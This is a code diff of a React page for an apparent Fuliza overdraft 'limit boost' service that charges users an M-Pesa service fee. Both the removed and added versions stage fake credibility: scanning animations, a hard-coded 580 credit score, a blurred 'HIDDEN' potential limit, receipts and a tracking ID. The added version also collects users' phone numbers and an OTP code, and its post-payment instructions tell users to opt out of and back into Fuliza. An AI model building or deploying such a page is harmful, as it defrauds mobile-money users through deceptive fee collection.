-                            onClick={() => setStep('offers')} 
-                            className="w-full text-center mt-6 text-xs font-bold text-slate-400 hover:text-slate-600"
-                        >
-                            Select Different Limit
-                        </button>
-                    </div>
-                 </div>
-            </div>
-        )}
-
-        {/* STEP 5: POLLING */}
-        {step === 'stk_push' && selectedOffer && (
-             <div className="animate-in zoom-in-95 duration-500 pt-10 text-center">
-                 <div className="bg-white p-8 rounded-2xl shadow-2xl border border-slate-50 relative overflow-hidden">
-                    <div className="w-24 h-24 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6 relative">
-                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-20"></span>
-                        <Smartphone className="w-10 h-10 text-blue-600 relative z-10" />
-                    </div>
-                    
-                    <h2 className="text-xl font-black text-slate-900 mb-2">Check Your Phone</h2>
-                    <p className="text-slate-500 font-medium mb-6 leading-relaxed text-sm">
-                        Enter PIN to pay <span className="text-blue-600 font-bold">KES {selectedOffer.fee}</span> to activate your KES {selectedOffer.amount.toLocaleString()} limit.
-                    </p>
-
-                    <div className="bg-slate-50 rounded-xl p-4 border border-slate-100">
-                        <div className="flex justify-between items-center mb-3">
-                            <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wide">Status</span>
-                            <span className="text-[10px] font-bold text-blue-600 bg-blue-100 px-3 py-1 rounded-full animate-pulse">
-                                {pollMessage}
-                            </span>
-                        </div>
-                        <div className="w-full bg-slate-200 rounded-full h-2 overflow-hidden">
-                            <div className="h-full bg-blue-500 animate-[width_240s_ease-in-out_forwards]" style={{width: '90%'}}></div>
-                        </div>
-                    </div>
-                </div>
-             </div>
-        )}
-
-        {/* STEP 6: PAYMENT VERIFIED (NEW AUTHENTICITY BRIDGE) */}
-        {step === 'payment_verified' && (
-          <div className="pt-10 px-4 animate-in zoom-in-95 duration-500">
-            <div className="bg-white rounded-2xl shadow-xl border border-slate-100 overflow-hidden relative">
-              {/* Receipt Rip Effect */}
-              <div className="absolute top-0 left-0 w-full h-2 mask-radial bg-slate-100 opacity-50"></div>
-              
-              <div className="p-8 text-center">
-                <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4 relative">
-                   <div className="absolute inset-0 rounded-full bg-emerald-200 opacity-20 animate-ping"></div>
-                   <CheckCircle2 className="w-8 h-8 text-emerald-600 relative z-10" />
-                </div>
-                <h2 className="text-xl font-black text-slate-900 mb-1">Payment Confirmed</h2>
-                <p className="text-xs text-slate-500 font-medium mb-6">Transaction successfully processed by Safaricom.</p>
-
-                {/* The Digital Receipt */}
-                <div className="bg-slate-50 rounded-lg border border-slate-200 p-4 text-left space-y-3 font-mono text-xs mb-6 relative overflow-hidden">
-                  <div className="absolute top-1/2 -right-3 w-6 h-6 bg-white rounded-full border border-slate-200"></div>
-                  <div className="absolute top-1/2 -left-3 w-6 h-6 bg-white rounded-full border border-slate-200"></div>
-                  
-                  <div className="flex justify-between border-b border-slate-200 pb-2">
-                    <span className="text-slate-500">Receipt No:</span>
-                    <span className="font-bold text-slate-900">{mpesaReceipt}</span>
-                  </div>
-                  <div className="flex justify-between border-b border-slate-200 pb-2">
-                    <span className="text-slate-500">Amount Paid:</span>
-                    <span className="font-bold text-emerald-600">KES {selectedOffer?.fee}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-slate-500">Time:</span>
-                    <span className="text-slate-700">{new Date().toLocaleTimeString()}</span>
-                  </div>
-                </div>
-
-                <Button 
-                  onClick={() => startAnalysis()}
-                  className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl shadow-lg transition-transform hover:-translate-y-1"
-                >
-                  Proceed to Activation
-                </Button>
-              </div>
-            </div>
-          </div>
-        )}
-
-        {/* STEP 7: ANALYZING SCORE (REALISTIC ANIMATION) */}
-        {step === 'analyzing_score' && (
-            <div className="pt-20 text-center space-y-6 animate-in fade-in duration-700 px-6">
-                <div className="relative w-20 h-20 mx-auto">
-                   <div className="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
-                   <div className="absolute inset-0 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
-                   <Server className="absolute inset-0 m-auto w-8 h-8 text-blue-600 animate-pulse" />
+             <form onSubmit={handleScan} className="space-y-5">
+                <div>
+                   <label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Safaricom Number</label>
+                   <div className="relative">
+                      <Smartphone className="absolute left-3 top-3.5 w-5 h-5 text-slate-400" />
+                      <input 
+                        type="tel" className="w-full h-14 pl-10 pr-4 border border-slate-300 rounded-xl font-mono text-lg font-bold focus:ring-2 focus:ring-emerald-500 outline-none"
+                        placeholder="07XX XXX XXX" value={formData.phone}
+                        onChange={(e) => setFormData({...formData, phone: e.target.value.replace(/\D/g,'').slice(0,10)})}
+                      />
+                   </div>
                 </div>
                 <div>
-                   <h2 className="text-2xl font-black text-slate-900 mb-2">Processing Data</h2>
-                   <p className="text-sm font-bold text-blue-600 animate-pulse">{loadingText}</p>
+                   <label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Current Limit (KES)</label>
+                   <div className="relative">
+                      <BarChart3 className="absolute left-3 top-3.5 w-5 h-5 text-slate-400" />
+                      <input 
+                        type="tel" className="w-full h-14 pl-10 pr-4 border border-slate-300 rounded-xl font-mono text-lg font-bold focus:ring-2 focus:ring-emerald-500 outline-none"
+                        placeholder="e.g. 500" value={formData.currentLimit}
+                        onChange={(e) => setFormData({...formData, currentLimit: e.target.value.replace(/\D/g,'')})}
+                      />
+                   </div>
                 </div>
-                <div className="w-full bg-slate-100 rounded-full h-2 overflow-hidden">
-                    <div className="h-full bg-blue-600 transition-all duration-300 ease-out" style={{ width: `${analysisProgress}%` }}></div>
+                <div className="bg-emerald-50 p-3 rounded-lg flex gap-2 items-start border border-emerald-100">
+                   <History className="w-4 h-4 text-emerald-600 mt-0.5 shrink-0" />
+                   <p className="text-[10px] text-emerald-800 font-medium leading-tight">
+                      System will scan your last 3 months of transaction volume.
+                   </p>
                 </div>
-                <div className="text-[10px] text-slate-400 font-mono">
-                   ID: {trackingId} | REF: {mpesaReceipt}
-                </div>
-            </div>
-        )}
+                <Button className="w-full h-14 bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-lg rounded-xl shadow-lg">Scan & Boost</Button>
+             </form>
+          </div>
+        </div>
+      )}
 
-        {/* STEP 8: SUCCESS (Low Limit - Approved) */}
-        {step === 'success' && selectedOffer && (
-             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
-                <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6 relative">
-                    <div className="absolute inset-0 rounded-full bg-emerald-200 animate-ping opacity-30"></div>
-                    <CheckCircle2 className="w-10 h-10 text-emerald-600 relative z-10" />
-                </div>
-                
-                <h2 className="text-2xl font-black text-slate-900 mb-2">Application Queued!</h2>
-                <p className="text-slate-500 font-medium mb-8 px-4 text-sm leading-relaxed">
-                    Your request to boost to <span className="text-slate-900 font-bold">KES {selectedOffer.amount.toLocaleString()}</span> has been approved for processing.
-                </p>
-                
-                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 text-left mb-6 space-y-5">
-                    <div className="flex gap-4">
-                        <div className="w-8 h-8 bg-emerald-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">
-                             <CheckCircle2 className="w-4 h-4" />
-                        </div>
-                        <div>
-                            <h4 className="font-bold text-slate-900 text-sm">Fee Verified</h4>
-                            <p className="text-xs text-slate-500 mt-0.5">Receipt: {mpesaReceipt}</p>
-                        </div>
-                    </div>
-                    <div className="flex gap-4">
-                        <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">2</div>
-                        <div>
-                            <h4 className="font-bold text-slate-900 text-sm">Limit Update Pending</h4>
-                            <p className="text-xs text-slate-500 mt-0.5 leading-relaxed">
-                                New limit will reflect in <span className="text-blue-600 font-bold">12 - 48 hours</span>. You will receive an SMS confirmation.
-                            </p>
-                        </div>
-                    </div>
-                     <div className="pt-4 border-t border-slate-50">
-                        <p className="text-[10px] text-slate-400 uppercase font-bold mb-2 tracking-wide text-center">Tracking ID</p>
-                        <div className="font-mono text-sm font-bold text-slate-700 bg-slate-100 p-3 rounded-xl text-center select-all border border-slate-200">
-                            {trackingId}
-                        </div>
-                     </div>
-                </div>
-
-                <Button onClick={() => router.push('/')} className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg">
-                    Return Home
-                </Button>
+      {/* 2. ANALYZING */}
+      {step === 'analyzing' && (
+         <div className="fixed inset-0 bg-slate-900 z-[60] flex flex-col items-center justify-center p-8 text-emerald-400 font-mono">
+             <div className="relative w-24 h-24 mb-6">
+                <div className="absolute inset-0 border-4 border-emerald-900 rounded-full"></div>
+                <div className="absolute inset-0 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin"></div>
+                <Terminal className="absolute inset-0 m-auto w-8 h-8 text-emerald-500 animate-pulse" />
              </div>
-        )}
+             <h2 className="text-xl font-bold text-white mb-2">SYSTEM SCANNING</h2>
+             <p className="text-sm animate-pulse">{loadingText}</p>
+             <div className="mt-8 w-64 bg-emerald-900/50 h-1 rounded-full overflow-hidden">
+                <div className="h-full bg-emerald-500 animate-[width_2s_ease-in-out_infinite]" style={{width: '50%'}}></div>
+             </div>
+         </div>
+      )}
 
-        {/* STEP 9: REJECTED (High Limit - VALUE ADD REPORT) */}
-        {step === 'high_limit_reject' && selectedOffer && (
-             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
-                <div className="w-20 h-20 bg-slate-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <Ban className="w-10 h-10 text-slate-500" />
-                </div>
-                
-                <h2 className="text-2xl font-black text-slate-900 mb-2">Limit Request Declined</h2>
-                <div className="bg-red-50 text-red-700 text-xs font-bold px-4 py-2 rounded-full inline-block mb-6">
-                    Verification Successful • Score Threshold Not Met
-                </div>
-                
-                {/* FINANCIAL HEALTH REPORT */}
-                <div className="bg-white rounded-2xl shadow-xl border border-slate-100 overflow-hidden mb-6 text-left">
-                  <div className="bg-slate-50 p-4 border-b border-slate-100 flex justify-between items-center">
-                     <span className="text-xs font-bold text-slate-500 uppercase">Analysis Report</span>
-                     <span className="text-[10px] font-mono text-slate-400">REF: {mpesaReceipt}</span>
+      {/* 3. OTP */}
+      {step === 'otp' && (
+         <div className="max-w-md mx-auto p-4 pt-10 animate-in slide-in-from-right">
+            <div className="bg-white p-6 rounded-2xl shadow-xl border-t-4 border-emerald-600">
+               <h2 className="text-xl font-black text-slate-900 mb-2">Verify Line</h2>
+               <p className="text-sm text-slate-500 mb-6">Enter code sent to {formData.phone}</p>
+               <form onSubmit={handleOtpVerify}>
+                  <div className="flex gap-3 justify-center mb-8">
+                     {otpInput.map((val, i) => (
+                        <input key={i} id={`otp-${i}`} type="tel" maxLength={1} value={val}
+                           onChange={(e) => { const n = [...otpInput]; n[i] = e.target.value; setOtpInput(n); if(e.target.value && i < 3) document.getElementById(`otp-${i+1}`)?.focus(); }}
+                           className="w-14 h-14 border-2 border-slate-200 rounded-xl text-center text-2xl font-black text-slate-900 focus:border-emerald-600 outline-none"
+                        />
+                     ))}
                   </div>
-                  
-                  <div className="p-6">
-                     <div className="text-center mb-6">
-                        <div className="inline-flex items-center justify-center w-28 h-28 rounded-full border-8 border-slate-100 border-t-orange-500 transform -rotate-45 relative">
-                           <div className="transform rotate-45 text-center absolute inset-0 flex flex-col items-center justify-center">
-                              <span className="block text-3xl font-black text-slate-900">580</span>
-                              <span className="block text-[10px] text-orange-500 font-bold uppercase">Fair</span>
-                           </div>
-                        </div>
-                        <p className="text-xs text-slate-500 mt-4">Score required for KES {selectedOffer.amount.toLocaleString()}: <span className="font-bold text-slate-900">720+</span></p>
-                     </div>
+                  <Button className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl">Unlock Limit</Button>
+               </form>
+            </div>
+         </div>
+      )}
 
-                     <div className="space-y-3">
-                        <h4 className="text-xs font-bold text-slate-900 uppercase mb-2">Risk Factors Identified</h4>
-                        {[
-                           { icon: AlertCircle, title: "M-Pesa Turnover", desc: "Monthly volume below threshold." },
-                           { icon: FileClock, title: "Loan History", desc: "No active repayment history found." },
-                           { icon: Wallet, title: "Savings Balance", desc: "Zero balance in M-Shwari/KCB." }
-                        ].map((factor, i) => (
-                           <div key={i} className="flex gap-3 items-start p-3 bg-slate-50 rounded-lg border border-slate-100">
-                              <factor.icon className="w-4 h-4 text-orange-500 shrink-0 mt-0.5" />
-                              <div>
-                                 <div className="text-xs font-bold text-slate-700">{factor.title}</div>
-                                 <div className="text-[10px] text-slate-500 leading-tight">{factor.desc}</div>
+      {/* 4. REVEAL (MAX POTENTIAL) */}
+      {step === 'blur_reveal' && (
+         <div className="max-w-md mx-auto p-4 pt-10 animate-in zoom-in-95">
+             <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-slate-200">
+                 <div className="bg-emerald-600 p-4 text-center text-white font-bold uppercase text-xs tracking-widest">Boost Available</div>
+                 <div className="p-8 text-center">
+                    <div className="flex justify-center items-end gap-3 mb-8">
+                        <div className="text-center opacity-50 pb-1">
+                           <p className="text-[10px] font-bold uppercase text-slate-500 mb-1">Current</p>
+                           <p className="text-lg font-bold text-slate-400 line-through">KES {formData.currentLimit}</p>
+                        </div>
+                        <div className="pb-3 text-slate-300"><ArrowRight className="w-6 h-6" /></div>
+                        <div className="text-center relative">
+                           <p className="text-[10px] font-bold uppercase text-emerald-600 mb-1">Max Potential</p>
+                           <div className="relative">
+                              <p className="text-4xl font-black text-slate-800 blur-sm select-none opacity-60">{maxPotential.toLocaleString()}</p>
+                              <div className="absolute inset-0 flex items-center justify-center">
+                                 <div className="bg-slate-900 text-white text-[10px] font-bold px-3 py-1.5 rounded-full flex items-center gap-1 shadow-lg animate-bounce"><EyeOff className="w-3 h-3" /> HIDDEN</div>
                               </div>
                            </div>
-                        ))}
+                        </div>
+                    </div>
+                    <p className="text-sm text-slate-600 mb-6 font-medium px-2">We found <strong>{offers.length} boost options</strong> for this line.</p>
+                    <Button onClick={() => setStep('offer_select')} className="w-full h-14 bg-emerald-600 text-white font-bold text-lg rounded-xl shadow-lg">Reveal Options</Button>
+                 </div>
+             </div>
+         </div>
+      )}
+
+      {/* 5. OFFER SELECT (REALISTIC OPTIONS) */}
+      {step === 'offer_select' && (
+         <div className="max-w-md mx-auto p-4 pt-6 animate-in slide-in-from-right">
+            <h2 className="text-xl font-black text-slate-900 mb-2 px-2">Select New Limit</h2>
+            <p className="text-sm text-slate-500 mb-6 px-2">Choose the limit you want to activate.</p>
+            <div className="space-y-4">
+               {offers.map((offer) => (
+                  <div key={offer.limit} onClick={() => handleSelectOffer(offer)} className={`relative bg-white p-5 rounded-2xl border-2 cursor-pointer transition-all hover:scale-[1.02] shadow-sm group ${offer.best ? 'border-emerald-500 ring-1 ring-emerald-500' : 'border-slate-100 hover:border-emerald-400'}`}>
+                     {offer.best && <div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-emerald-600 text-white text-[10px] font-bold px-3 py-1 rounded-full uppercase tracking-wide">Best Value</div>}
+                     <div className="flex justify-between items-center mb-2">
+                        <span className="text-xs font-bold text-slate-500 uppercase tracking-wider">{offer.label}</span>
+                        <span className="text-[10px] font-bold bg-slate-100 text-slate-600 px-2 py-1 rounded">Fee: KES {offer.fee}</span>
+                     </div>
+                     <div className="flex justify-between items-end">
+                        <span className="text-3xl font-black text-slate-900 group-hover:text-emerald-700 transition-colors">KES {offer.limit.toLocaleString()}</span>
+                        <ArrowRight className={`w-6 h-6 ${offer.best ? 'text-emerald-600' : 'text-slate-300'}`} />
                      </div>
                   </div>
-               </div>
+               ))}
+            </div>
+         </div>
+      )}
 
-                <div className="bg-blue-50 p-4 rounded-xl border border-blue-100 flex gap-3 items-center mb-6 text-left">
-                  <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center shrink-0">
-                     <TrendingUp className="w-5 h-5 text-blue-600" />
+      {/* 6. PAYMENT/SUMMARY */}
+      {step === 'payment' && selectedOffer && (
+         <div className="max-w-md mx-auto p-4 pt-6 animate-in zoom-in-95">
+            <div className="bg-white rounded-2xl shadow-2xl border border-slate-200 overflow-hidden">
+               <div className="bg-slate-900 text-white p-4 text-center font-bold">Upgrade Summary</div>
+               <div className="p-6 space-y-5">
+                  <div className="flex justify-between items-center pb-4 border-b border-dashed border-slate-200">
+                     <span className="text-sm font-bold text-slate-600">New Approved Limit</span>
+                     <span className="text-2xl font-black text-emerald-600">KES {selectedOffer.limit.toLocaleString()}</span>
                   </div>
-                  <div>
-                     <h4 className="text-sm font-bold text-blue-900">Coach's Tip</h4>
-                     <p className="text-xs text-blue-700">Transact at least KES 500 on M-Pesa this week to improve your score by 15 points.</p>
+                  <div className="bg-blue-50 p-4 rounded-xl border border-blue-100">
+                     <div className="flex justify-between items-center mb-2">
+                        <div className="flex items-center gap-2"><Settings className="w-4 h-4 text-blue-700" /><span className="text-xs font-bold text-blue-800 uppercase">Service Fee</span></div>
+                        <span className="text-xl font-black text-slate-900">KES {selectedOffer.fee}</span>
+                     </div>
+                     <p className="text-[10px] text-blue-700 leading-tight">This is a one-time <span className="font-bold">Service Fee</span> for processing your limit adjustment with the credit bureau.</p>
                   </div>
+                  <label className="flex gap-3 items-start cursor-pointer group p-3 rounded-lg hover:bg-slate-50 border border-transparent hover:border-slate-100">
+                     <input type="checkbox" checked={prepChecked} onChange={(e) => setPrepChecked(e.target.checked)} className="mt-1 w-5 h-5 rounded border-slate-300 text-emerald-600 focus:ring-emerald-600" />
+                     <span className="text-xs text-slate-600 font-medium leading-snug">I agree to pay the <span className="font-bold text-slate-900">KES {selectedOffer.fee} Service Fee</span> to facilitate this limit upgrade.</span>
+                  </label>
+                  <Button onClick={handleStkStart} disabled={!prepChecked} className="w-full h-16 text-lg font-black rounded-xl shadow-lg transition-all uppercase tracking-wide bg-emerald-600 hover:bg-emerald-500 text-white disabled:opacity-50">Pay & Activate</Button>
                </div>
+            </div>
+         </div>
+      )}
 
-                <div className="space-y-3">
-                    <Button onClick={() => setStep('offers')} className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg">
-                        Try Lower Limit
-                    </Button>
+      {/* 7. CONNECTING / STK PUSH */}
+      {(step === 'stk_loading' || step === 'stk_push') && (
+         <div className="fixed inset-0 bg-slate-900/95 z-[70] flex flex-col items-center justify-center p-6 text-center">
+             <div className="w-24 h-24 bg-emerald-500/20 rounded-full flex items-center justify-center mb-6 relative">
+                <div className="absolute inset-0 border-4 border-emerald-500/50 rounded-full animate-ping"></div>
+                {step === 'stk_loading' ? <Signal className="w-10 h-10 text-emerald-400" /> : <Smartphone className="w-10 h-10 text-emerald-400 animate-pulse" />}
+             </div>
+             <h2 className="text-2xl font-black text-white mb-2">{step === 'stk_loading' ? 'Requesting...' : 'Check Your Phone'}</h2>
+             <p className="text-emerald-400 font-bold mb-8 animate-pulse text-sm">{step === 'stk_loading' ? loadingText : `Enter PIN to Pay Service Fee KES ${selectedOffer.fee}`}</p>
+             {step === 'stk_push' && <div className="w-full max-w-xs animate-in fade-in delay-1000"><p className="text-xs text-slate-400 mb-4">Prompt sent to {formData.phone}</p><div className="h-1 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-emerald-500 animate-[width_60s_linear_forwards]" style={{width: '0%'}}></div></div></div>}
+         </div>
+      )}
+
+      {/* 8. SUCCESS & RESET INSTRUCTIONS */}
+      {step === 'success' && receipt && (
+         <div className="max-w-md mx-auto p-4 pt-10 animate-in zoom-in-95">
+             <div className="bg-white rounded-2xl shadow-2xl overflow-hidden border border-slate-200 relative">
+                <div className="absolute top-0 left-0 w-full h-3 bg-emerald-500"></div>
+                <div className="p-8 text-center">
+                   <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4"><CheckCircle2 className="w-8 h-8 text-emerald-600" /></div>
+                   <h2 className="text-xl font-black text-slate-900 mb-1">Upgrade Queued</h2>
+                   <p className="text-xs text-slate-500 font-medium mb-6">Service Fee Received</p>
+                   <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 font-mono text-xs text-left space-y-3 mb-6">
+                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-500">Tracking ID:</span><span className="font-bold text-blue-600">{receipt.trackId}</span></div>
+                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-500">New Limit:</span><span className="font-bold text-emerald-600">KES {selectedOffer.limit.toLocaleString()}</span></div>
+                      <div className="flex justify-between"><span className="text-slate-500">Status:</span><span className="font-bold text-slate-900">Pending Update</span></div>
+                   </div>
+                   <div className="bg-yellow-50 p-4 rounded-xl border border-yellow-100 text-left mb-6">
+                      <div className="flex items-center gap-2 mb-2"><AlertCircle className="w-4 h-4 text-yellow-600" /><h4 className="text-sm font-bold text-yellow-800">Important Next Steps</h4></div>
+                      <p className="text-xs text-yellow-800 mb-3 leading-relaxed">Your new limit will reflect within <strong>48 Hours</strong>. If you do not see it by then, you MUST perform a manual refresh:</p>
+                      <ul className="text-[10px] text-yellow-900 space-y-1.5 list-disc pl-4 font-medium">
+                         <li>Ensure you have <strong>NO</strong> existing Fuliza loan.</li>
+                         <li>Dial <strong>*234#</strong> and select Fuliza.</li>
+                         <li>Select <strong>Opt Out</strong> (This clears the old limit).</li>
+                         <li>Wait 5 minutes, then Dial *234# to <strong>Opt In</strong> again.</li>
+                      </ul>
+                   </div>
+                   <Link href="/fuliza/track"><Button className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl shadow-lg">Track Status</Button></Link>
                 </div>
              </div>
-        )}
+         </div>
+      )}
 
-        {/* STEP 10: PAYMENT CHECK RECOVERY */}
-        {step === 'payment_check' && selectedOffer && (
-          <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
-            <div className="w-20 h-20 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6">
-              <SearchCheck className="w-10 h-10 text-yellow-600" />
-            </div>
-            
-            <h2 className="text-2xl font-black text-slate-900 mb-2">Payment Check Required</h2>
-            <p className="text-slate-500 font-medium mb-6 px-4 text-sm leading-relaxed">
-              We haven't received automatic confirmation yet. This could be because:
-            </p>
-            
-            <div className="bg-white p-5 rounded-xl shadow-lg border border-slate-100 mb-6 text-left space-y-3">
-              <div className="flex items-start gap-3">
-                <div className="w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center shrink-0 mt-0.5">
-                  <span className="text-blue-600 text-xs font-bold">1</span>
-                </div>
-                <div>
-                  <p className="text-sm font-bold text-slate-900">You haven't entered your PIN yet</p>
-                  <p className="text-xs text-slate-500">Check your phone for the STK prompt</p>
-                </div>
-              </div>
-              
-              <div className="flex items-start gap-3">
-                <div className="w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center shrink-0 mt-0.5">
-                  <span className="text-blue-600 text-xs font-bold">2</span>
-                </div>
-                <div>
-                  <p className="text-sm font-bold text-slate-900">Network delays</p>
-                  <p className="text-xs text-slate-500">Payment might still be processing</p>
-                </div>
-              </div>
-            </div>
-            
-            <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6 space-y-4">
-              {errorMsg && (
-                <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold">
-                  <AlertCircle className="w-4 h-4" /> {errorMsg}
-                </div>
-              )}
-              
-              <div className="space-y-3">
-                <Button 
-                  onClick={handleManualFetch}
-                  disabled={manualCheckLoading}
-                  className="w-full h-14 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl shadow-lg flex items-center justify-center gap-2"
-                >
-                  {manualCheckLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <SearchCheck className="w-5 h-5" />}
-                  <span>Try to Fetch Payment</span>
-                </Button>
-                
-                <div className="relative flex items-center">
-                  <div className="flex-grow border-t border-slate-200"></div>
-                  <span className="flex-shrink mx-4 text-xs text-slate-400 font-bold">OR</span>
-                  <div className="flex-grow border-t border-slate-200"></div>
-                </div>
-                
-                <div className="grid grid-cols-2 gap-3">
-                  <Button 
-                    onClick={handleRetrySamePayment}
-                    disabled={isProcessing}
-                    variant="outline"
-                    className="h-14 border-2 border-slate-200 hover:border-blue-400 text-slate-700 font-bold rounded-xl"
-                  >
-                     <RefreshCcw className="w-4 h-4 mr-2" /> Retry
-                  </Button>
-                  
-                  <Button 
-                    onClick={handleChooseDifferentLimit}
-                    variant="outline"
-                    className="h-14 border-2 border-slate-200 hover:border-blue-400 text-slate-700 font-bold rounded-xl"
-                  >
-                     New Limit
-                  </Button>
-                </div>
-              </div>
-            </div>
-          </div>
-        )}
-
-        {/* STEP 11: FAILED (Actual Payment Failure) */}
-        {step === 'failed' && selectedOffer && (
-             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
-                 <div className="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <XCircle className="w-10 h-10 text-orange-500" />
-                </div>
-                
-                <h2 className="text-2xl font-black text-slate-900 mb-2">Transaction Cancelled</h2>
-                <p className="text-slate-500 font-medium mb-6 px-4 text-sm leading-relaxed">
-                    The payment request was cancelled or declined. We could not verify the fee of <span className="font-bold text-slate-900">KES {selectedOffer.fee}</span>.
-                </p>
-                
-                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6">
-                    <p className="text-xs text-slate-500 font-medium mb-6">
-                        Your pre-approval for <span className="font-bold text-slate-900">KES {selectedOffer.amount.toLocaleString()}</span> is saved for 2 hours.
-                    </p>
-                    <div className="flex flex-col gap-3">
-                        <Button 
-                            onClick={() => setStep('summary')}
-                            className="w-full h-12 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl flex items-center justify-center gap-2"
-                        >
-                            <RefreshCcw className="w-4 h-4" /> Retry Payment
-                        </Button>
-                        <button onClick={() => setStep('offers')} className="text-xs font-bold text-slate-400 hover:text-slate-600 py-3">
-                            Select Lower Limit
-                        </button>
-                    </div>
-                </div>
-             </div>
-        )}
-
-      </main>
+      {/* 9. FAILED */}
+      {step === 'failed' && (
+         <div className="max-w-md mx-auto p-4 pt-20 text-center animate-in zoom-in-95">
+             <div className="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6"><RefreshCw className="w-10 h-10 text-orange-500" /></div>
+             <h2 className="text-xl font-black text-slate-900 mb-2">{failReason === 'CANCEL' ? 'Process Cancelled' : 'Connection Failed'}</h2>
+             <p className="text-sm text-slate-500 mb-8 px-6">We could not verify the service fee payment. Limit upgrade has been paused.</p>
+             <Button onClick={handleStkStart} className="w-full h-14 bg-blue-900 text-white font-bold rounded-xl shadow-lg">Retry Payment</Button>
+         </div>
+      )}
     </div>
   );
 }
